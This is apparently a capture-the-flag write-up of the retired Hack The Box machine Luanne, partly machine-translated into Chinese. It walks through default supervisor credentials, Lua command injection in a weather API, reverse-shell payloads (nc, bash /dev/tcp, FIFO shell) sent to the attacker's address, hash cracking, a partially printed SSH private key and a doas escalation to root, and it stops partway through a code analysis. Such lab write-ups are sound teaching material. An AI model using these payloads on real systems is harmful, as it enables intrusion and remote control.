
Lua脚本支持的API，并利用命令注入漏洞来获得执行和shell
本地主机上侦听的Web服务器的凭据，并找到托管在那里的SSH密钥
root权限用户密码位于加密的备份文件中
# 高温透析器：卢安

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/27/htb-luanne.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fluanne-cover.) 

卢安是我在HTB上做的第一个NetBSD盒子。我将访问主管进程管理器的一个实例，并使用它来泄漏一个进程列表，该列表显示了在端口 80 Web 服务器上查找的位置。我会找到一个我知道由Lua脚本支持的API，并利用命令注入漏洞来获得执行和shell。我将获取在本地主机上侦听的Web服务器的凭据，并找到托管在那里的SSH密钥以访问第二个用户。该用户可以将任意命令作为root，需要密码才能（如BSD上的sudo）命令。它位于加密的备份文件中，可以使用主机上的PGP进行解密。在 Beyond Root 中，我将查看 Lua 脚本，弄清楚它是如何工作的，注入漏洞在哪里，并将其与修补的开发版本进行比较，以了解它是如何修复的。

## 箱子信息

名字

[卢安](https://www.hackthebox.eu/home/machines/profile/302) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-luanne.png) 

发行日期

[28 11月 2020](https://twitter.com/hackthebox_eu/status/1375037379313086469)

停用日期

27 3月 2021

操作系统

其他 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2FOther.png) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fluanne-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fluanne-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 01小时 34分钟 11秒。[![断续器](https://image.cubox.pro/article/2022091910535330943/81373.jpg)](https://www.hackthebox.eu/home/users/profile/77141)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 01小时 50分钟 24秒。[![断续器](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F13569)](https://www.hackthebox.eu/home/users/profile/13569)

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F159204)](https://www.hackthebox.eu/home/users/profile/159204)-

## 侦察

### n地图

`nmap`找到三个开放的 TCP 端口，SSH （22），HTTP （80） 和美迪萨 httpd / 主管进程管理器 （9001）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.218
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:33 EDT
    Warning: 10.10.10.218 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.218
    Host is up (0.023s latency).
    Not shown: 58365 filtered ports, 7167 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    9001/tcp open  tor-orport
    
    Nmap done: 1 IP address (1 host up) scanned in 71.24 seconds
    
    oxdf@parrot$ nmap -p 22,80,9001 -sCV -oA scans/nmap-tcpscripts 10.10.10.218
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 11:35 EDT
    Nmap scan report for 10.10.10.218
    Host is up (0.026s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
    | ssh-hostkey: 
    |   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
    |   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
    |_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
    80/tcp   open  http    nginx 1.19.0
    | http-auth: 
    | HTTP/1.1 401 Unauthorized\x0D
    |_  Basic realm=.
    | http-robots.txt: 1 disallowed entry 
    |_/weather
    |_http-server-header: nginx/1.19.0
    |_http-title: 401 Unauthorized
    9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
    | http-auth: 
    | HTTP/1.1 401 Unauthorized\x0D
    |_  Basic realm=default
    |_http-server-header: Medusa/1.12
    |_http-title: Error response
    Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 186.73 seconds
    

`nmap`将该框标识为正在运行的网状网络总线，这是另一个 BSD 变体。

TCP 80 有一个不允许的文件。`robots.txt``/weather`

### 主管进程管理器 - TCP 9001

#### 认证

访问该页面将返回 401 和身份验证提示：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325120130827.png) 

这里有一个提示，“默认”。

谷歌搜索“受监督的默认密码”会将最重要的内容返回到[配置文件](http://supervisord.org/configuration.html)上的项目文档。没有默认密码，但有一个示例配置文件：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325120522654.png) 

果然，输入user / 123让我进入网站：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325120551942.png) 

#### 进程列表

仪表板显示三个正在运行的脚本，单击其中任何一个脚本的名称都会导致输出。我没有从 或 . 返回：`memory``uptime``process`

    /python3.8 /usr/pkg/bin/supervisord-3.8 
    root        348  0.0  0.0  74136  2928 ?     Is    3:33PM 0:00.01 /usr/sbin/sshd 
    _httpd      376  0.0  0.0  35244  2008 ?     Is    3:33PM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
    root        402  0.0  0.0  20216  1664 ?     Is    3:33PM 0:00.01 /usr/sbin/cron 
    _httpd     1997  0.0  0.0  14564   484 ?     O     4:10PM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
    root        421  0.0  0.0  19784  1580 ttyE1 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE1 
    root        388  0.0  0.0  19784  1584 ttyE2 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE2 
    root        426  0.0  0.0  19780  1580 ttyE3 Is+   3:33PM 0:00.00 /usr/libexec/getty Pc ttyE3 
    

有一个长，可能会选择在此处显示完整流程列表的哪一行。唯一真正提供大量信息的命令行字符串是 ：`grep``httpd`

    /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
    

在[NetBSD（或博佐特特普）上使用httpd的手册页](https://www.daemon-systems.org/man/httpd.8.html)，参数是：

*   `-u`：支持将 /~user/ 形式的统一资源定位器转换为目录 ~user/public\_html
*   `-X`：启用目录索引
*   `-s`：强制记录到标准
*   `-i 127.0.0.1`：在本地主机上收听
*   `-I 3000`：侦听端口 3000
*   `-L weather weather.lua`：为前缀 添加 Lua 脚本。因此，访问将由此Lua脚本处理。`weather``http://10.10.10.218/weather/[something]`
*   `-U _http`：以\_http用户身份运行
*   `-b`：启用守护程序模式
*   `/var/www`：要从中提供服务的根目录

有趣的是，Lua 脚本正在处理文件中不允许的路径。`robots.txt`

### 网站 - TCP 80

#### 网站

尝试访问该网站时会弹出身份验证提示：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325113747662.png) 

#### 断续器 401

它不是盒子的一部分，但知道这里真正发生的事情很有趣。在Burp中，我会发现这实际上是来自浏览器的GET请求，来自服务器的401响应。火狐看到401并提示输入信誉。如果我添加一些并提交，它将再次发送相同的GET请求，这次带有额外的标头：`/`

    Authorization: Basic MHhkZjoweGRm
    

base64 字符串只是我输入的编码凭据：

    oxdf@parrot$ echo "MHhkZjoweGRm" | base64 -d
    0xdf:0xdf
    

#### 响应

更有趣的是，响应中有一些信息：

    HTTP/1.1 401 Unauthorized
    Server: nginx/1.19.0
    Date: Thu, 25 Mar 2021 15:40:47 GMT
    Content-Type: text/html
    Content-Length: 209
    Connection: close
    WWW-Authenticate: Basic realm="."
    
    <html><head><title>401 Unauthorized</title></head>
    <body><h1>401 Unauthorized</h1>
    /index.html: <pre>No authorization</pre>
    <hr><address><a href="//127.0.0.1:3000/">127.0.0.1:3000</a></address>
    </body></html>
    

如前所述，服务器是nginx。`nmap`

标头说所需的身份验证类型是HTTP基本，身份验证的描述只是，这并没有告诉我太多。`WWW-Authenticate: Basic realm="."``.`

还有一个参考作为此响应的来源。这表明NGINX正在代理80上的请求，以便在localhost端口3000上处理它们，如上面的进程列表中所述。`127.0.0.1:3000``httpd`

#### 目录暴力破解

我将针对该网站运行（[GitHub](https://github.com/epi052/feroxbuster)），但它找不到任何内容：`feroxbuster`

    oxdf@parrot$ feroxbuster -u http://10.10.10.218 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
                                                                                  
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__ 
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                            
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────                        
     🎯  Target Url            │ http://10.10.10.218
     🚀  Threads               │ 50
     📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1                 
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest 
    ───────────────────────────┴──────────────────────                       
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────                            
    [####################] - 15s    29999/29999   0s      found:0       errors:0
    [####################] - 14s    29999/29999   2005/s  http://10.10.10.218  
    

我正在尝试从[SecLists](https://github.com/danielmiessler/SecLists)中获取默认单词列表，但我也尝试了我的旧备用，也一无所获。`feroxbuster``directory-list-2.3-medium`

#### 使用来自主管的信息

有一个自定义 Lua 脚本在请求上运行。仅访问该路径将返回 404。但是再次运行会发现一些东西：`/weather/``feroxbuster`

    oxdf@parrot$ feroxbuster -u http://10.10.10.218/weather -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
     
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.218/weather
     🚀  Threads               │ 50
     📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    200        1l       12w        0c http://10.10.10.218/weather/forecast
    [####################] - 15s    29999/29999   0s      found:1       errors:0      
    [####################] - 15s    29999/29999   1976/s  http://10.10.10.218/weather
    

### 天气接口

访问将返回一个原始 JSON 有效负载，其中包含一个城市是必需的，以及有关如何列出它们的提示：`http://10.10.10.218/weather/forecast``message`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325122325849.png) 

此时，我可以切换到 和 ：`curl``jq`

    oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast | jq .
    {
      "code": 200,
      "message": "No city specified. Use 'city=list' to list available cities."
    }
    

我通常习惯性地使用卷曲，所以当我开始用管道将其连接到事物时，我看不到状态消息。`-s`

添加到 URL 的末尾提供了英国城市的列表：`?city=list`

    oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=list | jq .
    {
      "code": 200,
      "cities": [
        "London",
        "Manchester",
        "Birmingham",
        "Leeds",
        "Glasgow",
        "Southampton",
        "Liverpool",
        "Newcastle",
        "Nottingham",
        "Sheffield",
        "Bristol",
        "Belfast",
        "Leicester"
      ]
    }
    

从列表中选择一个城市，它会返回一堆关于那里天气的（不准确的）信息：

    oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=Leicester
    {"code": 200,"city": "Leicester","list": [{"date": "2021-03-25","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2021-03-26","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2021-03-27","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2021-03-28","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2021-03-29","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}
    

城市名称区分大小写，任何不完全匹配的输入都会导致 500 错误：

    oxdf@parrot$ curl -s http://10.10.10.218/weather/forecast?city=washington
    {"code": 500,"error": "unknown city: washington"}
    

## 壳牌作为\_http

### 识别注射

at 的请求被传递到 Lua 脚本，结果以 JSON 的形式返回，如果不存在于城市列表中的任何内容，则包含提交的输入。谷歌搜索“Lua注入”，返回的第一个链接标题为[“Lua Web应用程序安全漏洞”](https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities)。本文展示了许多不同类型的攻击，其中大多数比我在这里需要的要复杂得多。但我发现最有用的是易受攻击的脚本示例。发回的输出通常用类似 or 或 或 的东西写出来。如果没有逃脱完成，也许我可以注入命令。`/weather/forecast``r:puts(output)``ngx.say(output)``cgilua.put(output)`

仅发送双引号将返回错误消息，就好像该城市是：`"`

    oxdf@parrot$ curl -s 'http://10.10.10.218/weather/forecast?city="'
    {"code": 500,"error": "unknown city: ""}
    

但是，仅发送单个引号会使脚本崩溃：

    oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city='"
    <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
    

如果我添加一个结束的 parens，然后添加一个注释，它实际上会发回中间截断的有效负载：

    oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city=')+--"
    {"code": 500,"error": "unknown city:
    

这表明该字符串正在该命令中构建，并且注释删除了处理关闭和 的部分。`"``}`

### 注塑成型

要从 Lua 运行命令，[请离开显示](https://gtfobins.github.io/gtfobins/lua/#sudo)它只是 。添加有效的方法：`os.execute("[command]")`

    oxdf@parrot$ curl -s "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
    {"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd
    

为了执行更复杂的有效负载，我将切换到让我为我的arg编码：`curl`

    oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('id') --" 'http://10.10.10.218/weather/forecast' -s 
    {"code": 500,"error": "unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
    

`-G`将强制使用 GET 命令，并使用来自 url 而不是正文中的数据。`--data-urlencode`

### 壳

因为盒子是BSD，所以一些典型的Linux反向外壳将不起作用。我将从小事做起。可以重新连接到我吗？`nc`

    oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('nc 10.10.14.11 443') --" 'http://10.10.10.218/weather/forecast' -s
    

在我的听众中有一个连接：

    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 654
    

这不是一个外壳，但我知道盒子有netcat，可以连接到我。我可以尝试，但它不起作用。运行显示该选项不存在。我的goto Bash外壳实际上确实给出了一个连接，但随后立即死亡：`-e /bin/bash``nc -h 2>&1``-e`

    oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('bash -c "bash -i >& /dev/tcp/10.10.14.11/443 0&>1"') 'http://10.10.10.218/weather/forecast' -s
    

我尝试了Lua shell，但所需的模块不存在：

    oxdf@parrot$ curl -G --data-urlencode "city=') require('socket');require('os');t=socket.tcp();t:connect('10.10.14.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3') --" 'http://10.10.10.218/weather/forecast' -s
    {"code": 500,"error": "unknown city: <br>Lua error: [string "                httpd.write('{"code": 500,')..."]:2: module 'socket' not found:
            no field package.preload['socket']
            no file '/usr/share/lua/5.3/socket.lua'
            no file '/usr/share/lua/5.3/socket/init.lua'
            no file '/usr/lib/lua/5.3/socket.lua'
            no file '/usr/lib/lua/5.3/socket/init.lua'
            no file '/usr/lib/lua/5.3/socket.so'
            no file '/usr/lib/lua/5.3/loadall.so'
    

先进先出外壳确实有效：

    oxdf@parrot$ curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 443 >/tmp/f') --" 'http://10.10.10.218/weather/forecast' -s
    

它连接到一个监听：`nc`

    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.11] from (UNKNOWN) [10.10.10.218] 65453
    sh: can't access tty; job control turned off
    $ id
    uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
    

## 谢尔 饰 迈克尔斯

### 列举

#### 蹼

在 Web 根目录中有三个文件：

    $ pwd  
    /var/www
    $ ls -la
    total 20
    drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
    drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
    -rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
    -rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
    -rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
    

`index.html`有一个页面，我无法在没有身份验证的情况下访问：

    <!doctype html>
    <html>
      <head>
        <title>Index</title>
      </head>
      <body>
        <p><h3>Weather Forecast API</h3></p>
        <p><h4>List available cities:</h4></p>
        <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
        <p><h4>Five day forecast (London)</h4></p>
        <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
        <hr>
      </body>
    </html>
    

`robots.txt`与 中所述的 相同。 很有趣。这是定义基本身份验证要求的文件：`nmap``.htpasswd`

    webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
    

从建议开始，这是一个简单的md5crypt哈希（可以在[示例哈希的哈希猫列表中进行](https://hashcat.net/wiki/doku.php?id=example_hashes)验证）。哈希猫立即将其与 to 打破。`$1$``hashcat -m 500 htpasswd --user /usr/share/wordlists/rockyou.txt``iamthebest`

使用这些信誉，我现在可以加载：`http://10.10.10.218`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210325131747107.png) 

除了返回我已经利用的API的链接之外，这并没有真正提供任何新内容。

我确实看了一下Lua脚本，这很有趣，但对于特权来说不是必需的（查看超越根）。

#### 用户

盒子上只有一个用户，r.迈克尔斯：

    $ ls -l /home
    total 4
    dr-xr-x---  7 r.michaels  users  512 Sep 16  2020 r.michaels
    

\_http无法访问此目录。但似乎这个用户是一个很好的下一个目标。

进程列表中有一个进程作为 r.michaels 运行：

    $ ps auxww | grep michaels
    r.michaels  185  0.0  0.0  35028  1980 ?     Is    3:33PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
    

它看起来与上面的过程非常相似，但是这个脚本正在运行不同的脚本，侦听TCP 3001（而不是3000），并从中提供服务。`httpd``weather.lua``/home/r.michaels/devel/www`

### 利用漏洞开发天气 API \[失败\]

这是否容易受到同一漏洞的攻击？我可以从这个外壳访问它：

    $ curl -s http://127.0.0.1:3001/weather/forecast?city=list
    {"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
    

看起来这个版本不像以前那样容易受到命令注入的影响：

    $ curl -s -G http://127.0.0.1:3001/weather/forecast --data-urlencode "city=') os.execute('id') --"
    {"code": 500,"error": "unknown city: ') os.execute('id') --"}
    

我浏览了Lua脚本，寻找可能存在更难以猜测的漏洞的地方，但没有看到任何东西（至少在我有限的Lua经验中没有）。

### 首页阅读

我记得在命令行中看到它有点奇怪。这使得用户主目录 Web 中的公用文件夹可访问。当我开始戳这个服务时，我没有用户名，但我现在有。`-u``httpd`

尝试访问返回 401：`/~r.michaels/`

    $ curl -s http://127.0.0.1:3001/~r.michaels/
    <html><head><title>401 Unauthorized</title></head>
    <body><h1>401 Unauthorized</h1>
    ~r.michaels//: <pre>No authorization</pre>
    <hr><address><a href="//127.0.0.1:3001/">127.0.0.1:3001</a></address>
    </body></html>
    

我可以从文件中添加信誉，它们可以正常工作：`.htpasswd`

    $ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest
    <!DOCTYPE html>
    <html><head><meta charset="utf-8"/>
    <style type="text/css">
    table {
            border-top: 1px solid black;
            border-bottom: 1px solid black;
    }
    th { background: aquamarine; }
    tr:nth-child(even) { background: lavender; }
    </style>
    <title>Index of ~r.michaels/</title></head>
    <body><h1>Index of ~r.michaels/</h1>
    <table cols=3>
    <thead>
    <tr><th>Name<th>Last modified<th align=right>Size
    <tbody>
    <tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
    <tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
    </table>
    </body></html>
    

Directory listing is enabled ( in the command line), and this shows a single file, . One more returns the private key:`-X``id_rsa``curl`

    $ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB
    ...[snip]...
    

A note - This is not reading the private key from the users directory. For some reason, the user must have put their private key intentionally in their directory. Perhaps they figured since it’s only on localhost it was less at risk there. Then again, it’s not clear what use it provides the user there either.`~/.ssh``~/public_html`

### Shell via SSH

With a copy of this key, I can get a shell as r.michaels:

    oxdf@parrot$ ssh -i ~/keys/luanne-r.michaels r.michaels@10.10.10.218
    Last login: Fri Sep 18 07:06:51 2020
    NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
    
    Welcome to NetBSD!
    
    luanne$
    

And grab :`user.txt`

    luanne$ cat user.txt
    ea5f0ce6************************
    

## Shell as root

### doas

`sudo -l` is the first thing I check on Linux hosts. The equivalent on BSD is . The configuration file is a bit buried:`doas`

    luanne$ find / -name doas.conf 2>/dev/null
    /usr/pkg/etc/doas.conf
    

But it says that this user can run anything as root:

    luanne$ cat /usr/pkg/etc/doas.conf
    permit r.michaels as root
    

Unfortunately, it requires a password:

    luanne$ doas sh
    Password:
    doas: authentication failed
    

### Find Backup

In the current homedir, there are three folders:

    luanne$ ls
    backups     devel       public_html user.txt
    

`devel` has the code for the new version of the API. just has the SSH key. is interesting, holding what looks like an encrypted Tar archive:`public_html``backups`

    luanne$ ls -l backups/
    total 4
    -r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
    luanne$ file backups/devel_backup-2020-09-16.tar.gz.enc
    backups/devel_backup-2020-09-16.tar.gz.enc: data
    

### Decrypt

Looking around the box for any hint about what could be used to decrypt this data, I noticed a directory in r.michael’s home directory, and it contains keyrings:`.gnupg`

    luanne$ ls -l /home/r.michaels/.gnupg/
    total 8
    -rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
    -rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
    

`netpgp` is installed on the box, and it decrypts the file:

    luanne$ netpgp --decrypt --output=/tmp/0xdf.tar.gz backups/devel_backup-2020-09-16.tar.gz.enc
    signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
    Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
    uid              RSA 2048-bit key <r.michaels@localhost>
    
    luanne$ file /tmp/0xdf.tar.gz
    /tmp/0xdf.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
    

### Backup Analysis

The file decompresses to contain familiar files at this point:

    luanne$ tar zxvf 0xdf.tar.gz
    x devel-2020-09-16/
    x devel-2020-09-16/www/
    x devel-2020-09-16/webapi/
    x devel-2020-09-16/webapi/weather.lua
    x devel-2020-09-16/www/index.html
    x devel-2020-09-16/www/.htpasswd
    

`weather.lua` is exactly the same as the public version. is also similar. The file is different:`index.html``.htpasswd`

    luanne$ cat devel-2020-09-16/www/.htpasswd
    webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
    

It breaks the same way (), this time to the password .`hashcat -m 500 htpasswd2 --user /usr/share/wordlists/rockyou.txt``littlebear`

### doas sh

Now with a potential password, I can try to as root, and it works:`doas`

    luanne$ doas sh
    Password:
    # id
    uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
    

And I can grab the root flag:

    # cat root.txt
    7a9b5c20************************
    

## Beyond Root - Lua Injection

### Code Overview

I pretty much a noob at Lua, so of course I knew I wanted to understand how this script worked, and how I could inject into it, comparing the [vulnerable version](https://0xdf.gitlab.io/files/htb-luanne-weather.lua) to the [patched](https://0xdf.gitlab.io/files/htb-luanne-weather-dev.lua).

The general structure of the program looks like:

    httpd = require 'httpd'
    math = require 'math'
    sqlite = require 'sqlite'
    
    cities = {"London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Southampton", "Liverpool", "Newcastle", "Nottingham", "Sheffield", "Bristol", "Belfast", "Leicester"}
    
    weather_desc = {"sunny", "cloudy", "partially cloudy", "rainy", "snowy"}
    
    
    function valid_city(cities, city)
    ...[snip]...
    end
    
    
    function forecast(env, headers, query)
        if query and query["city"]
    ...[snip]...
    end
    
    httpd.register_handler('forecast', forecast)
    

It loads some modules, defines some constants and two functions, and then calls . This is actually mentioned on the [httpd man page](https://www.daemon-systems.org/man/httpd.8.html):`register_handler`

>          -L prefix script
>                     Adds a new Lua script for a particular prefix.  The prefix
>                     should be an arbitrary text, and the script should be a full
>                     path to a Lua script.  Multiple -L options may be passed.  A
>                     separate Lua state is created for each prefix.  The Lua script
>                     can register callbacks using the
>                     httpd.register_handler('<name>', function) Lua function, which
>                     will trigger the execution of the Lua function function when a
>                     URL in the form http://<hostname>/<prefix>/<name> is being
>                     accessed.  The function is passed three tables as arguments,
>                     the server environment, the request headers, and the decoded
>                     query string plus any data that was sent as application/x-www-
>                     form-urlencoded.
>     

So this is how gets to the script, and then it is passed to the function .`/weather/forecast``forecast`

The function just checks if a string is in the list. The function is where the injection is.`valid_city``forecast`

It starts by checking for the parameter, and if it’s not there, it writes the message I first got on visiting the API:`city`

    function forecast(env, headers, query)
        if query and query["city"]
        then
    ...[snip]...
        else
            httpd.write("HTTP/1.1 200 Ok\r\n")
            httpd.write("Content-Type: application/json\r\n\r\n")
            httpd.print('{"code": 200, "message": "No city specified. Use \'city=list\' to list available cities."}')
        end
    end
    

Back inside that snip above, it checks if , and if so, generates the list of cities as a JSON string, writing it with :`city=list``http.write`

            local city = query["city"]
            if city == "list"
            then 
                httpd.write("HTTP/1.1 200 Ok\r\n")
                httpd.write("Content-Type: application/json\r\n\r\n")
                httpd.write('{"code": 200,')
                httpd.write('"cities": [')
                for k,v in pairs(cities) do
                    httpd.write('"' .. v .. '"')
                    if k < #cities
                    then
                        httpd.write(',')
                    end
                end                                  
                httpd.write(']}')                        
    

If is not and it’s not a valid city, then it jumps into the error message creation:`city``list`

            elseif not valid_city(cities, city)                           
            then                                                            
                -- city=London') os.execute('id') --  
                httpd.write("HTTP/1.1 500 Error\r\n")    
                httpd.write("Content-Type: application/json\r\n\r\n")
                local json = string.format([[             
                    httpd.write('{"code": 500,')                       
                    httpd.write('"error": "unknown city: %s"}')           
                ]], city)                             
    
                load(json)()
            else
                -- just some fake weather data
                weather_data = {
    ...[snip generating random weather data]...
            end 
    

If it is a valid city, there’s a bunch of code generating random weather JSON.

### Vulnerability

The vulnerability is in how the error message JSON is created. First, a string, is created using the function:`json``string.format`

